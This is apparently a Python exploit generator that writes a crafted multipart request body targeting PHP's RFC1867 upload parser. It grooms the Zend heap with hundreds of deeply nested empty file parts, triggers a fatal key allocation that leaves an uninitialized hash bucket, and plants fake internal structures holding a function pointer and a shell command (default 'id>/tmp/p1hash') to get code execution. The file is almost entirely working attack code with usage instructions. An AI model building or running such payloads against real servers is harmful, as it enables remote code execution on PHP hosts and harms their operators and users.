#!/usr/bin/env python3
"""Path 1: multipart/hash-table partial bucket, no sessions.

The RFC1867 parser registers every file part as six $_FILES entries. Deeply
nested names and filename="" expand into many HashTables, buckets and key
strings. Hundreds of such records fill the Zend heap while the body stays small.
A final plain field with a long nested segment then makes the key allocation in
_zend_hash_str_add_or_update_i() fatal after nNumUsed was incremented, leaving
a bucket visible to teardown but never initialized.

No PHPSESSID and no PHP_SESSION_UPLOAD_PROGRESS field are sent. The session
module is not involved.

Body order: nested file records, fillers, post40, big, burners, a trailing file
part with a large content-type, groom fields, then the long-segment field.

usage:
  python3 path1_body.py --out /tmp/p1.bin
  python3 path1_body.py --out /tmp/p1.bin --big 60 --big-len 16000 \
      --groom 20 --groom-len 280 --longseg 4000 --longval 1000
"""
from __future__ import annotations

import argparse
import struct


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--parts", type=int, default=860)
    ap.add_argument("--depth", type=int, default=64)
    ap.add_argument("--key-pad", type=int, default=90)
    ap.add_argument("--fillers", type=int, default=14)
    ap.add_argument("--post40", type=int, default=1)
    ap.add_argument("--post40-len", type=int, default=15)
    ap.add_argument("--big", type=int, default=60)
    ap.add_argument("--big-len", type=int, default=16000)
    ap.add_argument("--burners", type=int, default=18)
    ap.add_argument("--burner-len", type=int, default=4000)
    ap.add_argument("--cttail", type=int, default=4000)
    ap.add_argument("--groom", type=int, default=20)
    ap.add_argument("--groom-len", type=int, default=280)
    ap.add_argument("--groom-nested", type=int, default=0)
    ap.add_argument("--groom-name", type=int, default=0)
    ap.add_argument("--fake-blk", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--fake-zif", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--fake-cmd", default="id>/tmp/p1hash")
    ap.add_argument("--fake-index", type=int, default=-1)
    ap.add_argument("--marker", action="store_true")
    ap.add_argument("--big-fake", action="store_true")
    ap.add_argument("--big-addr", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--file-groom", action="store_true")
    ap.add_argument("--longseg", type=int, default=4000)
    ap.add_argument("--longval", type=int, default=1000)
    ap.add_argument("--final", type=int, default=1)
    ap.add_argument("--final-prefix", default="files")
    ap.add_argument("--final-file", type=int, default=0)
    ap.add_argument("--boundary", default="C" * 10)
    args = ap.parse_args()

    b = args.boundary.encode()
    out = bytearray()

    def part(name: bytes, value: bytes = b"") -> None:
        out.extend(b"--" + b + b'\r\nContent-Disposition: form-data; name="' + name + b'"\r\n\r\n' + value + b"\r\n")

    def fake_block(blk: int, zif: int, cmd: str) -> bytes:
        v = bytearray(b"D" * 280)
        def p(fmt, off, val):
            struct.pack_into(fmt, v, off, val)
        p("<Q", 0x00, 0x0000000700000001)
        p("<I", 0x08, 0x10)
        p("<I", 0x0C, 0xFFFFFFF8)
        p("<Q", 0x10, blk + 0x60)
        p("<I", 0x18, 1); p("<I", 0x1C, 1); p("<I", 0x20, 1); p("<I", 0x24, 0)
        p("<Q", 0x28, 0); p("<Q", 0x30, zif)
        p("<Q", 0x40, blk); p("<I", 0x48, 0x307)
        p("<Q", 0x50, 0); p("<Q", 0x58, 0); p("<Q", 0x60, 0); p("<Q", 0x68, 0)
        p("<Q", 0x70, 0); p("<Q", 0x78, 0); p("<Q", 0x80, 0)
        p("<I", 0x88, 0); p("<I", 0x8C, 1)
        p("<Q", 0x90, 0); p("<Q", 0x98, 0); p("<I", 0xA0, 0)
        p("<Q", 0xB0, blk + 0xC0); p("<I", 0xB8, 6)
        p("<Q", 0xC0, 0x0000010600000001); p("<Q", 0xC8, 0); p("<Q", 0xD0, 14)
        c = cmd.encode()
        v[0xD8:0xD8+len(c)] = c
        return bytes(v)

    def fake_table(big: int, zif: int, cmd: str) -> bytes:
        v = bytearray(b"B" * 16000)
        def p(fmt, off, val):
            struct.pack_into(fmt, v, off, val)
        p("<Q", 0x00, 0x0000000700000001)
        p("<Q", 0x08, 0x10)
        p("<I", 0x0C, 0xFFFFFFF8)
        p("<Q", 0x10, big + 0x60)
        p("<I", 0x18, 1); p("<I", 0x1C, 1); p("<I", 0x20, 1); p("<I", 0x24, 0)
        p("<Q", 0x28, 0); p("<Q", 0x30, zif)
        p("<Q", 0x40, big); p("<I", 0x48, 0x307)
        p("<Q", 0x50, 0); p("<Q", 0x58, 0); p("<Q", 0x60, 0); p("<Q", 0x68, 0)
        p("<Q", 0x70, 0); p("<Q", 0x78, 0); p("<Q", 0x80, 0)
        p("<I", 0x88, 0); p("<I", 0x8C, 1)
        p("<Q", 0x90, 0); p("<Q", 0x98, 0); p("<I", 0xA0, 0)
        p("<Q", 0xB0, big + 0xC0); p("<I", 0xB8, 6)
        p("<Q", 0xC0, 0x0000010600000001); p("<Q", 0xC8, 0); p("<Q", 0xD0, 14)
        c = cmd.encode()
        v[0xD8:0xD8+len(c)] = c
        v[0xD8+len(c)] = 0
        return bytes(v)

    # Nested empty-upload records. Each is one file part; six $_FILES entries
    # and the deep hierarchy come from the nested name.
    for i in range(args.parts):
        name = ("files[R%05d%s]" % (i, "K" * args.key_pad)).encode() + b"[a]" * (args.depth - 2)
        out += b"--" + b
        out += b'\r\nContent-Disposition: form-data; name="' + name + b'"; filename=""'
        out += b"\r\nContent-Type: application/octet-stream\r\n\r\n"

    for i in range(args.fillers):
        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(args.post40):
        part(("s%02d" % i).encode(), b"v" * args.post40_len)
    for i in range(args.big):
        if args.big_fake and i == 0:
            part(("b%04d" % i).encode(), fake_table(args.big_addr, args.fake_zif, args.fake_cmd))
        else:
            part(("b%04d" % i).encode(), b"B" * args.big_len)
    for i in range(args.burners):
        part(("u%02d" % i).encode(), b"U" * args.burner_len)
    if args.cttail:
        out += b"--" + b + b'\r\nContent-Disposition: form-data; name="q"; filename="f"'
        out += b"\r\nContent-Type: " + b"C" * args.cttail + b"\r\n\r\n\r\n"
    # 280-byte values land raw buffers in bin 320, the bin of a fresh mixed
    # HashTable's arData (8 hash slots + 8 buckets = 288 bytes).
    for i in range(args.groom):
        fv = None
        if args.fake_blk and args.fake_zif:
            fi = args.fake_index if args.fake_index >= 0 else args.groom - 1
            if i == fi:
                fv = fake_block(args.fake_blk, args.fake_zif, args.fake_cmd)
        if args.marker:
            fv = b"G%02d" % i + b"D" * (args.groom_len - 4)
        val = fv if fv is not None else b"C" * args.groom_len
        if args.groom_name:
            part(b"C" * args.groom_name, val)
        elif args.groom_nested:
            part(("groom[g%02d]" % i).encode(), val)
        else:
            part(("g%02d" % i).encode(), val)
    if args.file_groom:
        fv = bytearray(b"F" * 288)
        struct.pack_into("<Q", fv, 0x00, args.big_addr)
        struct.pack_into("<I", fv, 0x08, 0x307)
        struct.pack_into("<Q", fv, 0x10, 0)
        struct.pack_into("<Q", fv, 0x18, 0)
        out += b"--" + b + b'\r\nContent-Disposition: form-data; name="X"; filename="f"'
        out += b"\r\nContent-Type: application/octet-stream\r\n\r\n" + bytes(fv) + b"\r\n"
    if args.final:
        fname = args.final_prefix.encode() + b"[" + b"L" * args.longseg + b"][a]"
        if args.final_file:
            out += b"--" + b
            out += b'\r\nContent-Disposition: form-data; name="' + fname + b'"; filename="f"'
            out += b"\r\nContent-Type: application/octet-stream\r\n\r\n" + b"V" * args.longval + b"\r\n"
        else:
            part(fname, b"V" * args.longval)

    out += b"--" + b + b"--\r\n"
    with open(args.out, "wb") as fh:
        fh.write(out)
    print("body=%d parts=%d depth=%d keys=%d" % (
        len(out), args.parts, args.depth,
        args.fillers + args.post40 + args.big + args.burners + (1 if args.groom_nested else args.groom) + (1 if args.final else 0)))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
